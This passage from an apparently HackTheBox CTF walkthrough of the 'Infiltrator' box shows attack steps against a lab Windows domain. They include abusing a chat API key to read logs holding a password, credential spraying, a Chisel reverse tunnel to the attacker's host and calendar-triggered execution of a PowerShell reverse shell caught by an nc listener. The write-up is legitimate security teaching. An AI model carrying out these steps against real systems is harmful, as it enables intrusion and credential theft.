443 699","title":"Marketing","status":"offline"},{"user":"M.harris","displayname":"M.harris","group":"Developers","role":"U","email":"harris@infiltrator.htb","phone":"+0 123 443 699","title":"Developer","status":"offline"},{"user":"O.martinez","displayname":"O.martinez","group":"Others","role":"U","email":"martinez@infiltrator.htb","phone":"","title":"Chief Marketing Officer","status":"online"},{"user":"A.walker","displayname":"A.walker","group":"Others","role":"U","email":"walker@infiltrator.htb","phone":"","title":"Co Founder","status":"offline"},{"user":"K.turner","displayname":"K.turner","group":"QA Testers","role":"U","email":"turner@infiltrator.htb","phone":"","title":"QA Tester","status":"offline"},{"user":"E.rodriguez","displayname":"E.rodriguez","group":"Digital Influencer Marketing","role":"U","email":"rodriguez@infiltrator.htb","phone":"+0 123 443 699","title":"Digital Influencer","status":"offline"},{"user":"winrm_svc","displayname":"winrm_svc","group":"Management and Security","role":"U","email":"winrm_svc@infiltrator.htb","phone":"+0 123 443 699","title":"Services Management","status":"online"},{"user":"Developer_01","displayname":"Developer_01","group":"Developers","role":"U","email":"Developer_01@infiltrator.htb","phone":"","title":"Developer","status":"offline"},{"user":"Developer_02","displayname":"Developer_02","group":"Developers","role":"U","email":"Developer_02@infiltrator.htb","phone":"","title":"Developer_02","status":"offline"},{"user":"Developer_03","displayname":"Developer_03","group":"Developers","role":"U","email":"Developer_03@infiltrator.htb","phone":"","title":"Developer_03","status":"offline"}],"success":true} </span></code></pre></div></div> <p>It worked.</p> <h4 id="rooms">Rooms</h4> <p><a href="https://support.outputmessenger.com/chat-room-api/">This page</a> describes the chat room API. <code class="language-plaintext highlighter-rouge">/api/chatrooms</code> will get all rooms:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains <span class="nt">-q</span> curl <span class="nt">-H</span> <span class="s2">"API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG"</span> localhost:14125/api/chatrooms <span class="nt">-s</span> | jq <span class="nb">.</span> <span class="go">{ "rows": [ { "room": "Chiefs_Marketing_chat", "roomusers": "O.martinez|0,A.walker|0" }, { "room": "Dev_Chat", "roomusers": "Admin|0,M.harris|0,K.turner|0,Developer_01|0,Developer_02|0,Developer_03|0" }, { "room": "General_chat", "roomusers": "Admin|0,D.anderson|0,L.clark|0,M.harris|0,O.martinez|0,A.walker|0,K.turner|0,E.rodriguez|0,winrm_svc|0,Developer_01|0,Developer_02|0,Developer_03|0" }, { "room": "Marketing_Team_chat", "roomusers": "D.anderson|0,L.clark|0" } ], "success": true } </span></code></pre></div></div> <p>The “Chiefs_Marketing_chat” has two users (and likely O.Martinez’s password). Requesting that room specifically doesn’t provide any additional information:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains <span class="nt">-q</span> curl <span class="nt">-H</span> <span class="s2">"API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG"</span> localhost:14125/api/chatrooms/Chiefs_Marketing_chat <span class="nt">-s</span> | jq <span class="nb">.</span> <span class="go">{ "row": { "room": "Chiefs_Marketing_chat", "roomusers": "A.walker|0,O.martinez|0" }, "success": true } </span></code></pre></div></div> <p>There’s an API to get logs from a room, but it requires the “Chat Room key”, which I have it from the database file <a href="/2025/06/14/htb-infiltrator.html#db-enumeration">above</a>.</p> <h4 id="pull-chat-logs">Pull Chat Logs</h4> <p>In addition to the <code class="language-plaintext highlighter-rouge">roomkey</code>, the API also requires a <code class="language-plaintext highlighter-rouge">fromdate</code> and <code class="language-plaintext highlighter-rouge">todate</code>. Without them, the error message makes it look like the <code class="language-plaintext highlighter-rouge">roomkey</code> is bad:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains <span class="nt">-q</span> curl <span class="nt">-H</span> <span class="s2">"API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG"</span> <span class="s1">'localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com'</span> <span class="go">{"success":false,"message":"logs chatroom does not exists!"} </span></code></pre></div></div> <p>But on adding them (picking an arbitrarily long time range):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains <span class="nt">-q</span> curl <span class="nt">-H</span> <span class="s2">"API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG"</span> <span class="s1">'localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&amp;fromdate=2010/01/01&amp;todate=2024/09/01'</span> <span class="go">{"success":true,"logs":"\u003cstyle\u003e\n*, *:before, *:after {\nbox-sizing: border-box;\n}\na {\ntext-decoration:none;\ncolor: black;\n}\na:link,a:visited,a:hover,a:active {\ncolor: black;\n}\n.room_log{\nfont-family: \"Open Sans\" ,Segoe UI,Calibri,Candara,Arial,sans-serif;\nfont-size: 13px;\nfont-weight: 400;\ncolor: #333;\nbackground-color: #fff;\n}\n.room_log p {\nmargin: 0px;\npadding: 0px;\nline-height: 20px;\n}\n.room_log #greybk {\nbackground-color: #f7f7f7;\nclear: both;\nwidth: 100%;\nfloat: left;\n}\n.room_log #whitebk {\nbackground-color: #fcfcfc;\nclear: both;\nwidth: 100%;\nfloat: left;\n}\n.room_log .nickname {\nclear: both;\ncolor: #A1A1A1;\nfloat: left;\nwidth: 70%;\n}\n.room_log .currentusernickname {\nclear: both;\ncolor: #319aff;\nfloat: left;\nwidth: 70%;\n}\n.room_log .msg_time, .room_log .msg_timeorange {\npadding: 2px 0p 0px 5px;\nclear: right;\nfloat: right;\nfont-size: 12px;\ncolor: #A1A1A1;\nwidth: 30%;\ntext-align: right;\n}\n.room_log .msg_timeorange {\ncolor: #f98c01;\n}\n.room_log .msg_body {\ncolor: #000000;\nfloat: left;\npadding: 0px 0px 5px 5px;\nwidth: 96%;\noverflow:auto;\n}\n.room_log .msg_leftgc{\ncolor: #A1A1A1;\nfont-size: 12px;\nfloat: right;\nfont-weight: bold;\npadding-bottom: 5px;\n}\n#whitebk.msg_leftgc, #greybk.msg_leftgc{\ntext-align:right;\n}\n.room_log .msg_signout {\ncolor: #0072c6;\nfloat: right;\nfont-weight: bold;\npadding-bottom: 5px;\n}\n.room_log .unreadmsg {\nfloat: right;\npadding: 5px 6px 0px 0px;\nwidth: 18px;\n}\n.room_log .datefont {\nfont-size: 17px;\nfont-weight: bold;\ncolor: #686667;\ntext-align: center;\nword-wrap: break-word;\n}\n.room_log .monthfont {\nfont-size: 12px;\nfont-weight: bold;\ncolor: #686667;\ntext-align: left;\nword-wrap: break-word;\n}\n.room_log .datebox {\nwidth: 38px;\nbackground-color: #e0e0e0;\ntext-align: center;\ntext-color: #686667;\nword-wrap: break-word;\nfloat: right;\n}\n.room_log .dashedline {\nmargin-top: 26px;\nborder-top: 1px dashed #d8d8d8;\nbackground-color: #FFFFFF;\nheight: 1px;\nwidth: 100%;\n}\n.room_log .highlighttext {\nbackground-color: lime;\nfont-weight: bold;\ntext-color: white;\n}\n.room_log .logfromname {\npadding-top: 4px;\nvertical-align: middle;\ncolor: #397dba;\nclear: both;\ndisplay: box;\n}\n.room_log .logdateorange {\ncolor: #ff9104;\nfont-size: 11px;\nfont-weight: italic;\nfloat: left;\npadding-top: 5px;\nclear: both;\nheight: 25px;\nwidth: 50%;\n}\n.room_log img.middle {\nvertical-align: middle;\n}\n.room_log img.bottom {\nvertical-align: bottom;\n}\n/*** Bullets ***/\n.room_log .bullet {\nfloat: left;\nposition: relative;\nwidth: 5px;\nheight: 15px;\nmargin: 0px 0px 0px 15px;\noverflow: hidden;\nclear: both;\n}\n.room_log .bullet img {\nvertical-align: middle;\nposition: absolute;\ntop: 60%;\nleft: 0px;\n}\n.room_log .bullet img.unread {\nmargin-left: -6px;\n}\n.room_log .bullet img.non-delivered {\n}\n.room_log .bullet img.read {\nmargin-left: -12px;\n}\n.room_log .sep {\npadding: 0 0 0 0;\nclear: both;\n}\n/*** End Bullets ***/\n/*** Emotions ***/\n.room_log .emotion {\nwidth: 16px;\nheight: 16px;\noverflow: hidden;\nposition: relative;\ndisplay: inline-block;\n}\n.room_log .emotion img {\nposition: absolute;\nleft: -5px;\ntop: -5px;\n}\n.room_log .e_whistle {\nwidth: 17px;\nheight: 17px;\n}\n.room_log .e_brb {\nwidth: 17px;\nheight: 17px;\n}\n.room_log .e_secret {\nwidth: 19px;\nheight: 19px;\n}\n/*First Row*/\n.room_log .emotion img.smile {\n}\n.room_log .emotion img.very_happy {\nmargin-left: -25px;\n}\n.room_log .emotion img.baring_teeth {\nmargin-left: -50px;\n}\n.room_log .emotion img.winking {\nmargin-left: -75px;\n}\n.room_log .emotion img.shocked {\nmargin-left: -100px;\n}\n.room_log .emotion img.omg {\nmargin-left: -125px;\n}\n.room_log .emotion img.tonque_out {\nmargin-left: -150px;\n}\n.room_log .emotion img.nerd {\nmargin-left: -175px;\n}\n/*Second Row*/\n.room_log .emotion img.angry {\nmargin-top: -25px;\n}\n.room_log .emotion img.ashamed {\nmargin-left: -25px;\nmargin-top: -25px;\n}\n.room_log .emotion img.i_dont_know {\nmargin-left: -50px;\nmargin-top: -25px;\n}\n.room_log .emotion img.confused {\nmargin-left: -75px;\nmargin-top: -25px;\n}\n.room_log .emotion img.crying {\nmargin-left: -100px;\nmargin-top: -25px;\n}\n.room_log .emotion img.sad {\nmargin-left: -125px;\nmargin-top: -25px;\n}\n.room_log .emotion img.dont_tell_anyone {\nmargin-left: -150px;\nmargin-top: -25px;\n}\n.room_log .emotion img.bye {\nmargin-left: -175px;\nmargin-top: -25px;\n}\n/*Third Row*/\n.room_log .emotion img.thinking {\nmargin-top: -51px;\n}\n.room_log .emotion img.sorry {\nmargin-left: -25px;\nmargin-top: -51px;\n}\n.room_log .emotion img.sleepy {\nmargin-left: -50px;\nmargin-top: -51px;\n}\n.room_log .emotion img.sick {\nmargin-left: -75px;\nmargin-top: -51px;\n}\n.room_log .emotion img.cool {\nmargin-left: -100px;\nmargin-top: -51px;\n}\n.room_log .emotion img.angel {\nmargin-left: -125px;\nmargin-top: -51px;\n}\n.room_log .emotion img.devil {\nmargin-left: -150px;\nmargin-top: -51px;\n}\n.room_log .emotion img.party {\nmargin-left: -175px;\nmargin-top: -51px;\n}\n/*Forth Row*/\n.room_log .emotion img.whistle {\nmargin-top: -78px;\n}\n.room_log .emotion img.brb {\nmargin-left: -25px;\nmargin-top: -78px;\n}\n.room_log .emotion img.secret {\nmargin-left: -50px;\nmargin-top: -78px;\n}\n.room_log .emotion img.headache {\nmargin-left: -75px;\nmargin-top: -78px;\n}\n.room_log .emotion img.gift {\nmargin-left: -100px;\nmargin-top: -78px;\n}\n.room_log .emotion img.birthday_cake {\nmargin-left: -125px;\nmargin-top: -78px;\n}\n.room_log .emotion img.heart {\nmargin-left: -150px;\nmargin-top: -78px;\n}\n.room_log .emotion img.broken_heart {\nmargin-left: -175px;\nmargin-top: -78px;\n}\n/*Fifth Row*/\n.room_log .emotion img.star {\nmargin-top: -106px;\n}\n.room_log .emotion img.clock {\nmargin-left: -25px;\nmargin-top: -103px;\n}\n.room_log .emotion img.coffee {\nmargin-left: -50px;\nmargin-top: -105px;\n}\n.room_log .emotion img.food {\nmargin-left: -75px;\nmargin-top: -105px;\n}\n.room_log .emotion img.money {\nmargin-left: -100px;\nmargin-top: -105px;\n}\n.room_log .emotion img.clapping_hands {\nmargin-left: -125px;\nmargin-top: -105px;\n}\n.room_log .emotion img.fingers_crossed {\nmargin-left: -150px;\nmargin-top: -105px;\n}\n.room_log .emotion img.snail {\nmargin-left: -175px;\nmargin-top: -105px;\n}\n/*Sixth Row*/\n.room_log .emotion img.rose {\nmargin-top: -130px;\n}\n.room_log .emotion img.wilted_rose {\nmargin-left: -25px;\nmargin-top: -130px;\n}\n.room_log .emotion img.play {\nmargin-left: -50px;\nmargin-top: -130px;\n}\n.room_log .emotion img.idea {\nmargin-left: -75px;\nmargin-top: -130px;\n}\n.room_log .emotion img.beer {\nmargin-left: -100px;\nmargin-top: -130px;\n}\n.room_log .emotion img.phone {\nmargin-left: -125px;\nmargin-top: -130px;\n}\n.room_log .emotion img.thumbs_up {\nmargin-left: -150px;\nmargin-top: -130px;\n}\n.room_log .emotion img.thumbs_down {\nmargin-left: -175px;\nmargin-top: -130px;\n}\n/*** End Emotions ***/\n#subject{\nborder:1px solid #A2E5FF;\nbackground-color:#C7EDFC;\npadding:5px 10px;\nwidth:100%;\nFONT-FAMILY: Segoe UI;\nfont-size:12px;\n}\n.notify_container{\nfloat:left;\nclear:both;\nwidth:100%;\npadding:10px 0px;\n}\n.notify{\nfloat:left;\npadding:5px 0px 5px 5px;\nbackground-color:#C7EDFC;\ncolor:Black;\nwidth:100%;\n}\n.notify .nickname{\ncolor:#000000;\n}\n#greybk.notify_container, #whitebk.notify_container{\npadding-top:0px; \n}\n.reply {\nborder-left:3px solid green;\npadding-left:5px;\nmargin-top:2px;\nmargin-bottom:5px;\nbackground-color:#f5f5f5;\nfloat:left;\nwidth:100%;\n}\n.reply_name {\ncolor:green;\nfont-size: 14px;\n}\n.reply_message {\ntext-overflow: ellipsis;\nwidth: 100%;\nheight:20px;\nwhite-space: nowrap;\noverflow: hidden;\ntext-overflow: ellipsis;\n}\n.reply_file {\nfloat:left;\ndisplay:none;\nheight:40px;\nvertical-align:middle; \ntext-align:center;\nposition:absolute;\nleft: 10px;\ntop: 2px;\n}\n.reply_file img {\nposition: absolute;\nmargin: auto;\ntop: 0;\nleft: 0;\nright: 0;\nbottom: 0;\n}\n.reply_container{\nfloat:left;\nwidth:100%;\nbox-sizing: border-box;\n}\n.reply_container .msg_time {\nfont-size: 10px;\npadding-right: 10px;\npadding-top: 3px;\n}\n \u003c/style\u003e\u003cdiv class=\u0027room_log\u0027\u003e\u003cdiv class=\u0027logdateorange\u0027\u003e20/02/2024\u003c/div\u003e\u003cdiv class=\u0027datebox\u0027\u003e \u003cspan class=\u0027datefont\u0027\u003e20\u003cbr\u003e\u003c/span\u003e\u003cspan class=\u0027monthfont\u0027\u003eFeb\u003c/span\u003e\u003c/div\u003e\u003cbr\u003e\u003cbr\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cdiv class=\u0027logfromName\u0027\u003e\u003cimg src=\u0027/temp/hash_dark_20.png\u0027 class=\u0027middle\u0027 title=\u0027\u0027 /\u003e Chiefs_Marketing_chat: A.walker, O.martinez\u003c/div\u003e\u003c/div\u003e\u003cbr\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cspan class=\u0027nickname\u0027 \u003eA.walker Says: \u003c/span\u003e\u003cdiv class=\u0027msg_time\u0027\u003e02:05 AM\u003c/div\u003e\u003cbr /\u003e\u003cdiv class=\u0027bullet\u0027\u003e\u003cimg src=\u0027/Temp/bullets.png\u0027 class=\u0027read\u0027 title=\u0027\u0027 /\u003e\u003c/div\u003e\u003cdiv class=\u0027msg_body\u0027 \u003eHey, hope you\u0027re doing well! What tasks do you have on your plate today?\u003c/div\u003e\u003cbr /\u003e\u003c/div\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cspan class=\u0027nickname\u0027 \u003eO.martinez Says: \u003c/span\u003e\u003cdiv class=\u0027msg_time\u0027\u003e02:06 AM\u003c/div\u003e\u003cbr /\u003e\u003cdiv class=\u0027bullet\u0027\u003e\u003cimg src=\u0027/Temp/bullets.png\u0027 class=\u0027read\u0027 title=\u0027\u0027 /\u003e\u003c/div\u003e\u003cdiv class=\u0027msg_body\u0027 \u003eThanks! I\u0027m working on the new marketing campaign and reviewing the budget for Q4. How about you?\u003c/div\u003e\u003cbr /\u003e\u003c/div\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cspan class=\u0027nickname\u0027 \u003eA.walker Says: \u003c/span\u003e\u003cdiv class=\u0027msg_time\u0027\u003e02:08 AM\u003c/div\u003e\u003cbr /\u003e\u003cdiv class=\u0027bullet\u0027\u003e\u003cimg src=\u0027/Temp/bullets.png\u0027 class=\u0027read\u0027 title=\u0027\u0027 /\u003e\u003c/div\u003e\u003cdiv class=\u0027msg_body\u0027 \u003eSounds busy! By the way, I need to check something in your account. Could you share your username password?\u003c/div\u003e\u003cbr /\u003e\u003c/div\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cspan class=\u0027nickname\u0027 \u003eO.martinez Says: \u003c/span\u003e\u003cdiv class=\u0027msg_time\u0027\u003e02:09 AM\u003c/div\u003e\u003cbr /\u003e\u003cdiv class=\u0027bullet\u0027\u003e\u003cimg src=\u0027/Temp/bullets.png\u0027 class=\u0027read\u0027 title=\u0027\u0027 /\u003e\u003c/div\u003e\u003cdiv class=\u0027msg_body\u0027 \u003esure!\u003c/div\u003e\u003cbr /\u003e\u003c/div\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cspan class=\u0027nickname\u0027 \u003eO.martinez Says: \u003c/span\u003e\u003cdiv class=\u0027msg_time\u0027\u003e02:09 AM\u003c/div\u003e\u003cbr /\u003e\u003cdiv class=\u0027bullet\u0027\u003e\u003cimg src=\u0027/Temp/bullets.png\u0027 class=\u0027read\u0027 title=\u0027\u0027 /\u003e\u003c/div\u003e\u003cdiv class=\u0027msg_body\u0027 \u003eO.martinez : m@rtinez@1996!\u003c/div\u003e\u003cbr /\u003e\u003c/div\u003e\u003c/div\u003e"} </span></code></pre></div></div> <p>The structure of the response is basically:</p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"success"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"logs"</span><span class="p">:</span><span class="w"> </span><span class="s2">"[HTML data]"</span><span class="p">}</span><span class="w"> </span></code></pre></div></div> <p>I’ll save the logs to a file:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains <span class="nt">-q</span> curl <span class="nt">-H</span> <span class="s2">"API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG"</span> <span class="s1">'localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&amp;fromdate=2010/01/01&amp;todate=2024/09/01'</span> <span class="nt">-s</span> | jq .logs <span class="nt">-r</span> <span class="o">&gt;</span> Chiefs_Marketing_chat.html </code></pre></div></div> <p>And open it in Firefox:</p> <picture> <source type="image/webp" srcset="/img/image-20240907072917494.webp" /> <img loading="lazy" src="/img/image-20240907072917494.png" alt="image-20240907072917494" class="include_image " /> </picture> <p>There’s the password.</p> <h3 id="output-messenger-1">Output Messenger</h3> <h4 id="auth">Auth</h4> <p>These creds don’t work for SMB or WinRM or RDP:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> o.martinez <span class="nt">-p</span> <span class="s1">'m@rtinez@1996!'</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\o.martinez:m@rtinez@1996! STATUS_LOGON_FAILURE </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm infiltrator.htb <span class="nt">-u</span> o.martinez <span class="nt">-p</span> <span class="s1">'m@rtinez@1996!'</span> <span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb) </span><span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\o.martinez:m@rtinez@1996! </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec rdp infiltrator.htb <span class="nt">-u</span> o.martinez <span class="nt">-p</span> <span class="s1">'m@rtinez@1996!'</span> <span class="netexec-protocol">RDP </span><span class="go"> 10.10.11.31 3389 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True) </span><span class="netexec-protocol">RDP </span><span class="go"> 10.10.11.31 3389 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\o.martinez:m@rtinez@1996! (STATUS_LOGON_FAILURE) </span></code></pre></div></div> <p>But they do work to get into Output Messenger.</p> <picture> <source type="image/webp" srcset="/img/image-20240907074859370.webp" /> <img loading="lazy" src="/img/image-20240907074859370.png" alt="image-20240907074859370" class="include_image " /> </picture> <h4 id="enumeration-2">Enumeration</h4> <p>There’s nothing new in the chats as O.Martinez that I haven’t seen already. They do have a lot of entries on their calendar:</p> <picture> <source type="image/webp" srcset="/img/image-20240907075924291.webp" /> <img loading="lazy" src="/img/image-20240907075924291.png" alt="image-20240907075924291" class="include_image " /> </picture> <p>These reminders are probably what is popping up every day as they are set to open a website:</p> <picture> <source type="image/webp" srcset="/img/image-20240907080145432.webp" /> <img loading="lazy" src="/img/image-20240907080145432.png" alt="image-20240907080145432" class="include_image " /> </picture> <h4 id="run-program">Run Program</h4> <p>The worst part of this box in my opinion is that I will be very stuck here until I try the Windows Output Messenger client. In Linux, the options for “Actions” are:</p> <picture> <source type="image/webp" srcset="/img/image-20240907080303819.webp" /> <img loading="lazy" src="/img/image-20240907080303819.png" alt="image-20240907080303819" class="include_image " /> </picture> <p>However, when I switch to Windows:</p> <picture> <source type="image/webp" srcset="/img/image-20240907092606748.webp" /> <img loading="lazy" src="/img/image-20240907092606748.png" alt="image-20240907092606748" class="include_image " /> </picture> <p>The easiest way I found to do this was to stop my Chisel proxy and restart it forwarding three ports:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\c.exe</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">10.10.14.6:8000</span><span class="w"> </span><span class="nx">R:14121:127.0.0.1:14121</span><span class="w"> </span><span class="nx">R:14125:127.0.0.1:14125</span><span class="w"> </span><span class="nx">R:14126:127.0.0.1:14126</span><span class="w"> </span><span class="go">c.exe : 2024/09/07 06:21:13 client: Connecting to ws://10.10.14.6:8000 2024/09/07 06:21:13 client: Connected (Latency 29.8624ms) </span></code></pre></div></div> <p>These listen on 0.0.0.0 on my VM Linux VM. Now in my Windows VM, when it asks for a server, I’ll give it the Linux IP:</p> <picture> <source type="image/webp" srcset="/img/image-20240907092431935.webp" /> <img loading="lazy" src="/img/image-20240907092431935.png" alt="image-20240907092431935" class="include_image " /> </picture> <h3 id="calendar-execution">Calendar Execution</h3> <h4 id="ping-poc">Ping POC</h4> <p>I’ll create a simple <code class="language-plaintext highlighter-rouge">.bat</code> file on my host and upload it to Infiltrator:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="nx">ping_test.bat</span><span class="w"> </span><span class="go"> Info: Uploading /media/sf_CTFs/hackthebox/infiltrator-10.10.11.31/ping_test.bat to C:\programdata\ping_test.bat Data: 28 bytes of 28 bytes copied Info: Upload successful! </span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">ping_test.bat</span><span class="w"> </span><span class="go">ping -n 1 10.10.14.6 </span></code></pre></div></div> <p>It’s important not to name it <code class="language-plaintext highlighter-rouge">ping.bat</code>, or the <code class="language-plaintext highlighter-rouge">ping</code> will try to run that, starting a loop.</p> <p>I’ll run it to make sure it works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\ping_test.bat</span><span class="w"> </span><span class="go"> </span><span class="gp">C:\programdata&gt;</span><span class="n">ping</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">10.10.14.6</span><span class="w"> </span><span class="go"> Pinging 10.10.14.6 with 32 bytes of data: Reply from 10.10.14.6: bytes=32 time=22ms TTL=63 Ping statistics for 10.10.14.6: Packets: Sent = 1, Received = 1, Lost = 0 (0% loss), Approximate round trip times in milli-seconds: Minimum = 22ms, Maximum = 22ms, Average = 22ms </span></code></pre></div></div> <p>At my host, there’s an ICMP packet:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp <span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 09:32:56.496522 IP 10.10.11.31 &gt; 10.10.14.6: ICMP echo request, id 1, seq 1909, length 40 09:32:56.496531 IP 10.10.14.6 &gt; 10.10.11.31: ICMP echo reply, id 1, seq 1909, length 40 </span></code></pre></div></div> <p>In Output, I’ll create a calendar event one minute from now:</p> <picture> <source type="image/webp" srcset="/img/image-20240907093747663.webp" /> <img loading="lazy" src="/img/image-20240907093747663.png" alt="image-20240907093747663" class="include_image " /> </picture> <p>I will have to have a file on my computer at <code class="language-plaintext highlighter-rouge">\programdata\ping_test.bat</code> for it to save the event, but that’s easy to create. Right at that time, I get a ping:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">09:35:54.651952 IP 10.10.11.31 &gt; 10.10.14.6: ICMP echo request, id 1, seq 1914, length 40 09:35:54.651968 IP 10.10.14.6 &gt; 10.10.11.31: ICMP echo reply, id 1, seq 1914, length 40 </span></code></pre></div></div> <h4 id="shell-1">Shell</h4> <p>I’ll grab a PowerShell #3 Base64 reverse shell one liner from <a href="https://www.revshells.com/">revshells.com</a> and put it into a file named <code class="language-plaintext highlighter-rouge">rev.bat</code>. I’ll upload it to Infiltrator:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="nx">rev.bat</span><span class="w"> </span><span class="go"> Info: Uploading /media/sf_CTFs/hackthebox/infiltrator-10.10.11.31/rev.bat to C:\programdata\rev.bat Data: 1796 bytes of 1796 bytes copied Info: Upload successful! </span></code></pre></div></div> <p>I’ll create another event for soon:</p> <picture> <source type="image/webp" srcset="/img/image-20240907094147990.webp" /> <img loading="lazy" src="/img/image-20240907094147990.png" alt="image-20240907094147990" class="include_image " /> </picture> <p>When the time rolls around, I get a shell:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lnvp</span> 443 <span class="go">Listening on 0.0.0.0 443 Connection received on 10.10.11.31 50279 </span><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span><span class="nb">whoami</span> <span class="go">infiltrator\o.martinez </span></code></pre></div></div> <h2 id="auth-as-lan_mangment">Auth as lan_mangment</h2> <h3 id="enumeration-3">Enumeration</h3> <h4 id="bloodhound-1">BloodHound</h4> <p>Checking O.Martinez in BloodHound, they don’t have any new controls (I already own M.Harris):</p> <picture> <source type="image/webp" srcset="/img/image-20240907101843036.webp" /> <img loading="lazy" src="/img/image-20240907101843036.png" alt="image-20240907101843036" class="include_image " /> </picture> <p>They can RDP into DC01:</p> <picture> <source type="image/webp" srcset="/img/image-20240907101812678.webp" /> <img loading="lazy" src="/img/image-20240907101812678.png" alt="image-20240907101812678" class="include_image " /> </picture> <p>I’ll need a password to do this.</p> <h4 id="filesystem">Filesystem</h4> <p>O.Martinez’s home directory is relatively empty as well. I’ll check the <code class="language-plaintext highlighter-rouge">AppData</code> directory for Output here as well, and there’s a PCAP file:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\O.martinez\appdata\roaming\Output Messenger\FAAA\Received Files\203301&gt; </span><span class="n">ls</span><span class="w"> </span><span class="go"> Directory: C:\Users\O.martinez\appdata\roaming\Output Messenger\FAAA\Received Files\203301 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2/23/2024 4:10 PM 292244 network_capture_2024.pcapng </span></code></pre></div></div> <p>I’ll download that (the easiest way I found was to copy it to <code class="language-plaintext highlighter-rouge">programdata</code> and download it from an Evil WinRM session).</p> <h3 id="network_capture_2024pcapng">network_capture_2024.pcapng</h3> <h4 id="overview">Overview</h4> <p>I’ll open the file in Wireshark and get an idea for what’s in it. There are 237 packets, which suggests no noise:</p> <picture> <source type="image/webp" srcset="/img/image-20240907095947942.webp" /> <img loading="lazy" src="/img/image-20240907095947942.png" alt="image-20240907095947942" class="include_image " /> </picture> <p>Statistics –&gt; Protocol Hierarchy shows it’s mostly HTTP and TLS:</p> <picture> <source type="image/webp" srcset="/img/image-20240907100059619.webp" /> <img loading="lazy" src="/img/image-20240907100059619.png" alt="image-20240907100059619" class="include_image " /> </picture> <p>Looking at Statistics –&gt; Conversations, on the TCP tab, shows that 192.168.1128.232 is the host where the collection is being done:</p> <picture> <source type="image/webp" srcset="/img/image-20240907100217695.webp" /> <img loading="lazy" src="/img/image-20240907100217695.png" 